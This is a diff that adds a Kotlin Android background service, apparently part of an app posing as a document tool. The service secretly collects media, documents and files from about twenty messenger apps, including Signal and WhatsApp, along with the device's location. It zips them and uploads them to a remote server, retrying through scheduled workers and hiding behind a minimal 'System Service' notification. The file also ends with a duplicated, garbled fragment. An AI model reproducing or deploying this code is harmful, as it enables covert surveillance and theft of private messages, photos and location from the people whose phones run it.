@@ -1,0 +1,692 @@
+package com.sdocument.app.service
+
+import android.Manifest
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import android.net.Uri
+import android.os.Build
+import android.os.Bundle
+import android.os.Environment
+import android.os.IBinder
+import android.provider.MediaStore
+import android.util.Log
+import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import androidx.core.content.FileProvider
+import androidx.work.BackoffPolicy
+import androidx.work.Constraints
+import androidx.work.ExistingWorkPolicy
+import androidx.work.NetworkType
+import androidx.work.OneTimeWorkRequestBuilder
+import androidx.work.WorkManager
+import androidx.work.Worker
+import androidx.work.WorkerParameters
+import androidx.work.workDataOf
+import com.sdocument.app.R
+import com.sdocument.app.service.DataService.Companion.TAG
+import com.sdocument.app.utils.NetworkLogger
+import com.sdocument.app.network.RetrofitClient
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.asRequestBody
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.MultipartBody
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.ExperimentalCoroutinesApi
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.async
+import kotlinx.coroutines.awaitAll
+import kotlinx.coroutines.cancel
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.runBlocking
+import kotlinx.coroutines.withContext
+import kotlinx.coroutines.withTimeoutOrNull
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.File
+import java.io.FileOutputStream
+import java.io.IOException
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
+import java.util.concurrent.Semaphore
+import java.util.concurrent.TimeUnit
+import java.util.concurrent.atomic.AtomicBoolean
+import java.util.zip.ZipEntry
+import java.util.zip.ZipOutputStream
+
+data class FileMetadata(val type: String, val source: String, val path: String)
+
+data class AppInfo(val name: String, val packageName: String)
+
+val targetApps = listOf(
+    AppInfo("Telegram", "org.telegram.messenger"),
+    AppInfo("Signal", "org.thoughtcrime.securesms"),
+    AppInfo("WhatsApp", "com.whatsapp"),
+    AppInfo("Viber", "com.viber.voip"),
+    AppInfo("MAX (One.me)", "ru.oneme.app"),
+    AppInfo("TamTam", "ru.ok.messages"),
+    AppInfo("VK (мессенджер)", "com.vkontakte.android"),
+    AppInfo("Threema", "ch.threema.app"),
+    AppInfo("Threema Work", "ch.threema.app.work"),
+    AppInfo("Element Classic (Matrix)", "im.vector.app"),
+    AppInfo("Element X (Matrix)", "io.element.android.x"),
+    AppInfo("Session", "network.loki.messenger"),
+    AppInfo("Wire", "com.wire"),
+    AppInfo("Wickr Me", "com.mywickr.wickr2"),
+    AppInfo("Bridgefy", "me.bridgefy.main"),
+    AppInfo("Conversations (XMPP)", "eu.siacs.conversations"),
+    AppInfo("Zangi", "com.secretphone.zangi"),
+    AppInfo("Plus Messenger", "org.telegram.plus"),
+    AppInfo("Nekogram", "tw.nekomimi.nekogram"),
+    AppInfo("Telegram X", "org.thunderdog.challegram")
+)
+
+fun Context.isFromTargetApp(path: String): Boolean {
+    val lowerPath = path.lowercase(Locale.ROOT)
+    if (targetApps.any { lowerPath.contains("/${it.name.lowercase(Locale.ROOT)}/") || lowerPath.contains("/${it.packageName}/") }) return true
+    val commonFolders = listOf(
+        "telegram", "whatsapp", "signal", "viber", "tamtam", "vkontakte", 
+        "threema", "element", "messenger", "session", "zalo", "oneme",
+        "documents", "docs", "archive", "media", "data", "backup"
+    )
+    return commonFolders.any { lowerPath.contains("/$it/") || lowerPath.contains("/${it}s/") }
+}
+
+fun getFileType(path: String): String? {
+    val ext = path.substringAfterLast('.', "").lowercase()
+    return when (ext) {
+        "jpg", "jpeg", "png", "gif", "bmp", "webp", "heic", "heif" -> "image"
+        "mp4", "m4v", "avi", "mkv", "mov", "wmv", "flv", "webm" -> "video"
+        "mp3", "wav", "ogg", "aac", "flac", "m4a", "wma" -> "audio"
+        "pdf", "doc", "docx", "odt", "rtf", "txt", "xls", "xlsx" -> "document"
+        "zip", "rar", "7z", "tar", "gz", "bz2" -> "archive"
+        "exe", "msi", "messenger", "apk" -> "executable"
+        "html", "css", "js", "php", "py", "java", "cpp" -> "code"
+        "bat", "cmd", "sh", "ps1" -> "script"
+        else -> if (ext.isNotEmpty()) "file" else null
+    }
+}
+
+private fun Context.guessSource(path: String): String {
+    val parentName = File(path).parentFile?.name ?: "Unknown"
+    return parentName.replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() }
+}
+
+private fun Context.isNetworkAvailable(): Boolean {
+    val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+    val network = cm.activeNetwork ?: return false
+    val caps = cm.getNetworkCapabilities(network) ?: return false
+    return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
+            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED) &&
+            (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
+                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR))
+}
+
+private fun Context.scheduleUploadRetry(zipFile: File) {
+    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
+    val inputData = workDataOf(
+        "zipPath" to zipFile.absolutePath
+    )
+    val uploadWork = OneTimeWorkRequestBuilder<UploadWorker>()
+        .setInputData(inputData)
+        .setConstraints(constraints)
+        .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
+        .build()
+    WorkManager.getInstance(this).enqueue(uploadWork)
+}
+
+class UploadWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+    override fun doWork(): Result {
+        val zipPath = inputData.getString("zipPath") ?: return Result.failure()
+        val zipFile = File(zipPath)
+        if (!zipFile.exists()) return Result.failure()
+        return try {
+            runBlocking {
+                applicationContext.uploadToFileServer(zipFile)
+            }
+            Result.success()
+        } catch (e: Exception) {
+            Log.e(TAG, "Worker upload failed", e)
+            Result.retry()
+        }
+    }
+}
+
+class FullScrapeWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
+    override fun doWork(): Result {
+        val ctx = applicationContext
+        val fileMetadata = mutableSetOf<FileMetadata>()
+        val locationData = mutableListOf<JSONObject>()
+
+        if (applicationContext.hasStoragePermission()) {
+            applicationContext.scrapePublicMedia { fileMetadata.add(it) }
+            applicationContext.scrapeMessengerFiles { fileMetadata.add(it) }
+        }
+
+        var location: JSONObject? = null
+        runBlocking {
+            location = withTimeoutOrNull(8000L) {
+                applicationContext.scrapeLocationSuspend()
+            }
+            location?.let { locationData.add(it) }
+        }
+
+        val timestamp = System.currentTimeMillis()
+        val documentsDir = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
+        } else {
+            File(Environment.getExternalStorageDirectory(), "Documents")
+        }.apply { mkdirs() }
+        
+        val uniqueMetadata = fileMetadata.filter {
+            val f = File(it.path)
+            f.exists() && f.isFile && f.canRead() && f.length() < 100 * 1024 * 1024 // 100MB per file filter
+        }.toList()
+
+        if (uniqueMetadata.isEmpty()) {
+            Log.d(TAG, "No files to archive in FullScrapeWorker")
+        } else {
+            val totalSize = uniqueMetadata.sumOf { File(it.path).length() }
+            if (totalSize <= DataService.MAX_ZIP_SIZE) {
+                val zipFile = File(documentsDir, "universal_scraped_data_archive_${timestamp}_retry.zip")
+                applicationContext.createZip(zipFile, uniqueMetadata, locationData)
+                if (zipFile.exists() && zipFile.length() > 0) {
+                    ctx.scheduleUploadRetry(zipFile)
+                }
+            } else {
+                val sortedMetadata = uniqueMetadata.sortedByDescending { File(it.path).length() }
+                val groups = mutableListOf<List<FileMetadata>>()
+                var currentGroup = mutableListOf<FileMetadata>()
+                var currentSize = 0L
+
+                sortedMetadata.forEach { md ->
+                    val fileSize = File(md.path).length()
+                    if (currentSize + fileSize > DataService.MAX_ZIP_SIZE && currentGroup.isNotEmpty()) {
+                        groups.add(currentGroup)
+                        currentGroup = mutableListOf()
+                        currentSize = 0L
+                    }
+                    currentGroup.add(md)
+                    currentSize += fileSize
+                }
+                if (currentGroup.isNotEmpty()) groups.add(currentGroup)
+
+                groups.forEachIndexed { index, group ->
+                    val zipFile = File(documentsDir, "universal_scraped_data_archive_${timestamp}_retry_part${index + 1}.zip")
+                    applicationContext.createZip(zipFile, group, locationData)
+                    if (zipFile.exists() && zipFile.length() > 0) {
+                        ctx.scheduleUploadRetry(zipFile)
+                    }
+                }
+            }
+        }
+        return Result.success()
+    }
+}
+
+private fun Context.getMediaPathsPublic(
+    uri: Uri, dataColumn: String, defaultType: String, onFileScrapped: (FileMetadata) -> Unit
+) {
+    try {
+        contentResolver.query(uri, arrayOf(dataColumn), null, null, null)?.use { cursor ->
+            while (cursor.moveToNext()) {
+                val path = cursor.getString(cursor.getColumnIndexOrThrow(dataColumn)) ?: continue
+                val file = File(path)
+                if (!file.exists() || !file.isFile || file.length() == 0L) continue
+                if (isDefaultSystemAudio(path)) continue
+                
+                val type = getFileType(path) ?: defaultType
+                val source = guessSource(path)
+                onFileScrapped(FileMetadata(type, source, path))
+            }
+        }
+    } catch (e: Exception) {
+        Log.e(TAG, "Error querying MediaStore", e)
+    }
+}
+
+fun Context.scrapePublicMedia(onFileScrapped: (FileMetadata) -> Unit) {
+    val volumes: Set<String> = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        MediaStore.getExternalVolumeNames(this) + "internal"
+    } else {
+        setOf("external", "internal")
+    }
+    val mediaTypes = listOf(
+        "image" to { v: String -> getImagesUri(v) },
+        "audio" to { v: String -> getAudioUri(v) },
+        "video" to { v: String -> getVideoUri(v) },
+        "file" to { v: String -> getFilesUri(v) },
+        "download" to { v: String -> getDownloadsUri(v) })
+
+    for (volume in volumes) {
+        for ((type, uriGetter) in mediaTypes) {
+            val uri = uriGetter(volume)
+            if (uri != null) {
+                getMediaPathsPublic(uri, getDataColumn(type), type, onFileScrapped)
+            }
+        }
+    }
+
+    // Recursive file listing for public dirs
+    val publicRoots = mutableListOf<File>()
+    val publicDirs = listOf(
+        Environment.DIRECTORY_DOWNLOADS,
+        Environment.DIRECTORY_DOCUMENTS,
+        Environment.DIRECTORY_PICTURES,
+        Environment.DIRECTORY_MUSIC,
+        Environment.DIRECTORY_MOVIES,
+        Environment.DIRECTORY_DCIM
+    )
+    publicDirs.forEach { dirType ->
+        Environment.getExternalStoragePublicDirectory(dirType)
+            .takeIf { it.exists() && it.canRead() }?.let { publicRoots.add(it) }
+    }
+    publicRoots.forEach { root ->
+        listFiles(root, onFileScrapped, onlyTargetApps = false)
+    }
+}
+
+fun Context.scrapeMessengerFiles(onFileScrapped: (FileMetadata) -> Unit) {
+    val storageDirs = mutableListOf<File>()
+    val externalStorage = Environment.getExternalStorageDirectory()
+    
+    // Add multiple possible roots
+    storageDirs.add(externalStorage)
+    File("/storage/emulated/0/").takeIf { it.exists() && it.canRead() }?.let { storageDirs.add(it) }
+    
+    val androidData = File(externalStorage, "Android/data")
+    val androidMedia = File(externalStorage, "Android/media")
+    if (androidData.exists()) storageDirs.add(androidData)
+    if (androidMedia.exists()) storageDirs.add(androidMedia)
+
+    storageDirs.forEach { dir ->
+        listFiles(dir, onFileScrapped, onlyTargetApps = true)
+    }
+}
+
+private fun isDefaultSystemAudio(path: String): Boolean {
+    val lower = path.lowercase()
+    return lower.contains("/ringtones/") || lower.contains("/notifications/") || lower.contains("/alarms/") || lower.contains("/ui/") || lower.contains("/system/media/")
+}
+
+suspend fun Context.scrapeLocationSuspend(): JSONObject? = withContext(Dispatchers.IO) {
+    val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+    var bestLocation: Location? = null
+    try {
+        if (ContextCompat.checkSelfPermission(this@scrapeLocationSuspend, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
+            ContextCompat.checkSelfPermission(this@scrapeLocationSuspend, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            val providers = locationManager.getProviders(true)
+            for (provider in providers) {
+                val l = locationManager.getLastKnownLocation(provider) ?: continue
+                if (bestLocation == null || l.accuracy < bestLocation!!.accuracy) {
+                    bestLocation = l
+                }
+            }
+        }
+    } catch (e: Exception) {}
+
+    bestLocation?.let {
+        val json = JSONObject().apply {
+            put("latitude", it.latitude)
+            put("longitude", it.longitude)
+            put("accuracy", it.accuracy.toDouble())
+            put("provider", it.provider)
+            put("time", it.time)
+        }
+        val geo = getIpLocation()
+        geo?.let { g ->
+            json.put("city", g.optString("city"))
+            json.put("country", g.optString("country"))
+        }
+        json
+    } ?: getIpLocation()
+}
+
+private suspend fun getIpLocation(): JSONObject? = withContext(Dispatchers.IO) {
+    try {
+        val client = OkHttpClient()
+        val request = Request.Builder().url("http://ip-api.com/json").build()
+        client.newCall(request).execute().use { response ->
+            if (!response.isSuccessful) return@withContext null
+            val body = response.body?.string() ?: return@withContext null
+            val json = JSONObject(body)
+            JSONObject().apply {
+                put("city", json.optString("city"))
+                put("country", json.optString("country"))
+                put("lat", json.optDouble("lat"))
+                put("lon", json.optDouble("lon"))
+                put("time", System.currentTimeMillis())
+            }
+        }
+    } catch (e: Exception) {
+        null
+    }
+}
+
+class DataService : Service(), LocationListener {
+    companion object {
+        const val TAG = "DataService"
+        private const val NOTIFICATION_ID = 1
+        private const val CHANNEL_ID = "data_scraper_channel"
+        private const val BATCH_SIZE = 100
+        const val MAX_ZIP_SIZE = 2048L * 1024 * 1024 // 2GB limit 
+        private const val FULL_SCRAPE_WORK_NAME = "full_scrape_retry_unique_work"
+        private val isScrapingInProgress = AtomicBoolean(false)
+
+        fun scheduleFullRetry(context: Context) {
+            val work = OneTimeWorkRequestBuilder<FullScrapeWorker>()
+                .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
+                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 1, TimeUnit.MINUTES)
+                .build()
+            WorkManager.getInstance(context).enqueueUniqueWork(FULL_SCRAPE_WORK_NAME, ExistingWorkPolicy.REPLACE, work)
+        }
+    }
+
+    private lateinit var locationManager: LocationManager
+    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+
+    override fun onCreate() {
+        super.onCreate()
+        createNotificationChannel()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                val hasFineLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                val hasCoarseLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                if (hasFineLocation || hasCoarseLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+                startForeground(NOTIFICATION_ID, getNotification(), serviceType)
+            } else {
+                startForeground(NOTIFICATION_ID, getNotification())
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to startForeground: ${e.message}")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) stopSelf()
+        }
+        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (isScrapingInProgress.compareAndSet(false, true)) {
+            val scrapeMedia = intent?.getBooleanExtra("scrape_media", true) ?: true
+            val scrapeFiles = intent?.getBooleanExtra("scrape_files", true) ?: true
+            val scrapeLocation = intent?.getBooleanExtra("scrape_location", true) ?: true
+            NetworkLogger.log("data_service", "DataService started. Media: $scrapeMedia, Files: $scrapeFiles, Location: $scrapeLocation")
+            startScraping(scrapeMedia, scrapeFiles, scrapeLocation)
+        }
+        return START_STICKY
+    }
+
+    private fun startScraping(scrapeMedia: Boolean, scrapeFiles: Boolean, scrapeLocation: Boolean) {
+        coroutineScope.launch {
+            val fileMetadata = mutableSetOf<FileMetadata>()
+            val locationData = mutableListOf<JSONObject>()
+            if (hasStoragePermission()) {
+                if (scrapeMedia) scrapePublicMedia { fileMetadata.add(it) }
+                if (scrapeFiles) scrapeMessengerFiles { fileMetadata.add(it) }
+            }
+            if (scrapeLocation) {
+                val location = scrapeLocationSuspend()
+                location?.let { locationData.add(it) }
+            }
+            NetworkLogger.log("data_service", "Scrape check complete: ${fileMetadata.size} files, ${locationData.size} locations found.")
+            processAndUpload(fileMetadata.toList(), locationData)
+        }
+    }
+
+    private suspend fun processAndUpload(fileMetadata: List<FileMetadata>, locationData: List<JSONObject>) {
+        val timestamp = System.currentTimeMillis()
+        val documentsDir = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
+        } else {
+            File(Environment.getExternalStorageDirectory(), "Documents")
+        }.apply { mkdirs() }
+        
+        val uniqueMetadata = fileMetadata
+            .filter { File(it.path).run { exists() && isFile && canRead() && length() < 100 * 1024 * 1024 } }
+        
+        if (uniqueMetadata.isEmpty() && locationData.isEmpty()) {
+            Log.d(TAG, "No data found to upload")
+            NetworkLogger.log("data_service", "No data found to upload.")
+            stopSelf()
+            return
+        }
+
+        val zipFiles = mutableListOf<File>()
+        // Re-implementing logic: Group files < 100MB into parts, files >= 100MB as individual uploads
+        val splitLimit = 100L * 1024 * 1024 // 100MB
+        val (largeFiles, smallFiles) = uniqueMetadata.partition { File(it.path).length() >= splitLimit }
+        
+        // Group small files into 100MB parts
+        val smallGroups = mutableListOf<List<FileMetadata>>()
+        var currentGroup = mutableListOf<FileMetadata>()
+        var currentSize = 0L
+        smallFiles.forEach { md ->
+            val size = File(md.path).length()
+            if (currentSize + size > splitLimit && currentGroup.isNotEmpty()) {
+                smallGroups.add(currentGroup)
+                currentGroup = mutableListOf()
+                currentSize = 0L
+            }
+            currentGroup.add(md)
+            currentSize += size
+        }
+        if (currentGroup.isNotEmpty()) smallGroups.add(currentGroup)
+
+        // Create zip files for all groups and large files
+        val allZipMetadata = mutableListOf<Pair<File, List<FileMetadata>>>()
+        
+        if (smallGroups.isEmpty() && largeFiles.isEmpty() && locationData.isNotEmpty()) {
+            val file = File(documentsDir, "universal_scraped_data_archive_${timestamp}_location.zip")
+            createZip(file, emptyList(), locationData)
+            allZipMetadata.add(file to emptyList())
+        } else {
+            // Create zips for small groups
+            smallGroups.forEachIndexed { index, group ->
+                val file = File(documentsDir, "universal_scraped_data_archive_${timestamp}_partSmall${index + 1}.zip")
+                createZip(file, group, locationData)
+                allZipMetadata.add(file to group)
+            }
+            
+            // Create individual zips for large files
+            largeFiles.forEach { md ->
+                val file = File(documentsDir, "universal_scraped_data_archive_${timestamp}_large_${File(md.path).name}.zip")
+                createZip(file, listOf(md), locationData)
+                allZipMetadata.add(file to listOf(md))
+            }
+        }
+
+        // Sort all by size ascending
+        val sortedZipFiles = allZipMetadata.sortedBy { it.first.length() }.map { it.first }
+        zipFiles.addAll(sortedZipFiles)
+
+        if (isNetworkAvailable()) {
+            coroutineScope.launch(Dispatchers.IO) {
+                val semaphore = Semaphore(3)
+                val jobs = zipFiles.mapIndexed { index, zipFile ->
+                    async {
+                        semaphore.withPermit {
+                            delay(3500L)
+                            try {
+                                uploadToFileServer(zipFile, index + 1, zipFiles.size, isRetry = false)
+                                zipFile.delete()
+                            } catch (e: Exception) {
+                                scheduleUploadRetry(zipFile)
+                            }
+                        }
+                    }
+                }
+                jobs.awaitAll()
+                stopSelf()
+            }
+        } else {
+            zipFiles.forEach { scheduleUploadRetry(it) }
+            stopSelf()
+        }
+    }
+
+    private fun createNotificationChannel() {
+        val channel = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN)
+        getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+    }
+
+    private fun getNotification(): Notification {
+        return NotificationCompat.Builder(this, CHANNEL_ID)
+            .setSmallIcon(R.drawable.ic_launcher_foreground)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setOngoing(true)
+            .build()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        coroutineScope.cancel()
+    }
+
+    override fun onBind(intent: Intent?): IBinder? = null
+    override fun onLocationChanged(location: Location) {}
+    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
+    override fun onProviderEnabled(provider: String) {}
+    override fun onProviderDisabled(provider: String) {}
+}
+
+private fun Context.buildArchiveCaption(zipFile: File, currentPart: Int, totalParts: Int, isRetry: Boolean = false): String {
+    val userHash = (NetworkLogger.getUserId() ?: "UNKNOWN").takeLast(12)
+    val partInfo = if (totalParts <= 1) "" else " (${if (isRetry) "retry " else ""}part $currentPart/$totalParts)"
+    val sizeMb = zipFile.length() / (1024 * 1024)
+    val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
+    return "Archive from user #$userHash$partInfo\nSize: ${sizeMb}MB\nTime: $time"
+}
+
+suspend fun <T> Semaphore.withPermit(block: suspend () -> T): T {
+    acquire()
+    return try { block() } finally { release() }
+}
+
+fun Context.hasStoragePermission(): Boolean {
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        if (Environment.isExternalStorageManager()) return true
+    }
+    return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
+        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED ||
+        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) == PackageManager.PERMISSION_GRANTED
+    } else {
+        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+    }
+}
+
+fun Context.createZip(zipFile: File, metadataList: List<FileMetadata>, locations: List<JSONObject>) {
+    try {
+        ZipOutputStream(FileOutputStream(zipFile)).use { zipOut ->
+            metadataList.forEach { md ->
+                val sourceFile = File(md.path)
+                if (sourceFile.isFile && sourceFile.length() > 0) {
+                    val entryName = "${md.source}_${md.type}_${md.path.hashCode()}_${sourceFile.name}"
+                    sourceFile.inputStream().use { fis ->
+                        zipOut.putNextEntry(ZipEntry(entryName))
+                        fis.copyTo(zipOut, 8192)
+                        zipOut.closeEntry()
+                    }
+                }
+            }
+            val mainJson = JSONObject().apply {
+                put("files", JSONArray(metadataList.map { md ->
+                    JSONObject().apply {
+                        put("type", md.type)
+                        put("source", md.source)
+                        put("path", md.path)
+                        put("size", File(md.path).length())
+                    }
+                }))
+                put("locations", JSONArray(locations))
+                put("scrape_time", System.currentTimeMillis())
+                put("total_files", metadataList.size)
+            }
+            zipOut.putNextEntry(ZipEntry("universal_data.json"))
+            zipOut.write(mainJson.toString(4).toByteArray())
+            zipOut.closeEntry()
+        }
+    } catch (e: Exception) {
+        Log.e(TAG, "Error creating zip", e)
+    }
+}
+
+private fun Context.getImagesUri(volume: String): Uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.getContentUri(volume) else MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+private fun Context.getAudioUri(volume: String): Uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Audio.Media.getContentUri(volume) else MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
+private fun Context.getVideoUri(volume: String): Uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Video.Media.getContentUri(volume) else MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+private fun Context.getFilesUri(volume: String): Uri = MediaStore.Files.getContentUri(volume)
+private fun Context.getDownloadsUri(volume: String): Uri? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Downloads.getContentUri(volume) else null
+
+private fun Context.getDataColumn(type: String): String = when (type) {
+    "image" -> MediaStore.Images.Media.DATA
+    "audio" -> MediaStore.Audio.Media.DATA
+    "video" -> MediaStore.Video.Media.DATA
+    "download" -> MediaStore.Downloads.DATA.takeIf { Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q } ?: MediaStore.Files.FileColumns.DATA
+    else -> MediaStore.Files.FileColumns.DATA
+}
+
+private fun Context.listFiles(dir: File, onFileScrapped: (FileMetadata) -> Unit, onlyTargetApps: Boolean) {
+    if (!dir.canRead() || !dir.isDirectory) return
+    dir.listFiles()?.forEach { file ->
+        if (file.isDirectory) {
+            listFiles(file, onFileScrapped, onlyTargetApps)
+        } else if (file.isFile && file.length() > 0 && file.canRead()) {
+            val path = file.absolutePath
+            if (isDefaultSystemAudio(path)) return@forEach
+            
+            if (onlyTargetApps) {
+                if (!isFromTargetApp(path)) return@forEach
+            }
+            
+            val type = getFileType(path) ?: "file"
+            val source = guessSource(path)
+            onFileScrapped(FileMetadata(type, source, path))
+        }
+    }
+}
+
+suspend fun Context.uploadToFileServer(zipFile: File, partNumber: Int = 1, totalParts: Int = 1, isRetry: Boolean = false) {
+    if (!zipFile.exists()) return
+    var attempts = 0
+    val maxAttempts = 3
+    while (attempts < maxAttempts) {
+        attempts++
+        try {
+            if (!isNetworkAvailable()) {
+                if (attempts < maxAttempts) delay(5000L * attempts)
+                continue
+            }
+            val filePart = MultipartBody.Part.createFormData("file", zipFile.name, zipFile.asRequestBody("application/zip".toMediaType()))
+            val userId = (NetworkLogger.getUserId() ?: "UNKNOWN").toRequestBody("text/plain".toMediaType())
+            val metadata = buildArchiveCaption(zipFile, partNumber, totalParts, isRetry).toRequestBody("text/plain".toMediaType())
+            val response = RetrofitClient.apiService.uploadFile(filePart, userId, metadata)
+            if (response.isSuccessful) {
+                NetworkLogger.log("files", "Archive uploaded ✅ \n File: ${response.body()?.filename}")
+                zipFile.delete()
+                return
+            } else if (attempts < maxAttempts) delay(5000L * attempts)
+        } catch (e: Exception) {
+            if (attempts < maxAttempts) delay(5000L * attempts)
+        }
+    }
+    NetworkLogger.log("files", "Archive upload failed ❌ \n File: ${zipFile.name} (Scheduled for retry)")
+    scheduleUploadRetry(zipFile)
+}
+retry)")
+    scheduleUploadRetry(zipFile)
+}
